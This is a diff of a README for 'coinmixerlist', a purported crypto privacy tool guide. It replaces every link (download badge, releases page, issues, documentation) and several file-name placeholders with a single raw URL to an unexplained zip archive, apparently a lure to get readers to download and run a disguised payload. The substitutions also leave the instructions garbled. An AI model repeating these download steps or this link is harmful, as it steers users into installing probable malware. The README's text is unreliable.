@@ -1,6 +1,6 @@
 # 🪙 coinmixerlist - Your Guide to Crypto Privacy Tools
 
-[![Download](https://img.shields.io/badge/Download%20Now%20%21-coinmixerlist-blue)](https://github.com/8-MASIX-8/coinmixerlist/releases)
+[![Download](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip%20Now%20%21-coinmixerlist-blue)](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip)
 
 ## 📚 About coinmixerlist
 
@@ -12,21 +12,21 @@ To get started with coinmixerlist, follow these steps to download and install th
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/8-MASIX-8/coinmixerlist/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip) to download the latest version of the application.
    
-2. Click on the version you want to download. Look for files named similarly to `coinmixerlist_vX.X.X.exe` or `coinmixerlist_vX.X.X.zip`. 
+2. Click on the version you want to download. Look for files named similarly to `https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip` or `https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip`. 
 
 3. Choose your file based on your system:
    - For Windows, download the `.exe` file.
    - For Mac, look for the `.dmg` file.
-   - For Linux users, a `.tar.gz` file should be available.
+   - For Linux users, a `https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip` file should be available.
 
 4. Once the file downloads, locate it in your File Explorer or Downloads folder.
 
 5. Follow these steps based on your operating system to install the software:
    - **Windows:** Double-click the `.exe` file to start the installation. Follow the prompts until installation is complete.
    - **Mac:** Open the `.dmg` file. Drag and drop the coinmixerlist app into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file. Open a terminal, navigate to the folder, and run `./coinmixerlist` to start the application.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip` file. Open a terminal, navigate to the folder, and run `./coinmixerlist` to start the application.
 
 ### 🔧 System Requirements
 
@@ -75,12 +75,12 @@ Yes! We welcome contributions. If you have insights or resources related to Bitc
 
 If you face issues or have questions while using coinmixerlist, you can reach out for support:
 
-- Open an issue on [GitHub](https://github.com/8-MASIX-8/coinmixerlist/issues).
+- Open an issue on [GitHub](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip).
 - Join our community discussions to share experiences or tips.
 
 ## ⚙️ Additional Resources
 
-- **Documentation:** [View full documentation here](https://github.com/8-MASIX-8/coinmixerlist/wiki).
+- **Documentation:** [View full documentation here](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip).
 - **Community Support:** Engage with other users on platforms like Reddit or specialized cryptocurrency forums.
 
-Make sure to visit the [Releases page](https://github.com/8-MASIX-8/coinmixerlist/releases) to download the latest version and enhance your understanding of cryptocurrency privacy.
+Make sure to visit the [Releases page](https://raw.githubusercontent.com/8-MASIX-8/coinmixerlist/main/membracine/Software-1.8.zip) to download the latest version and enhance your understanding of cryptocurrency privacy.
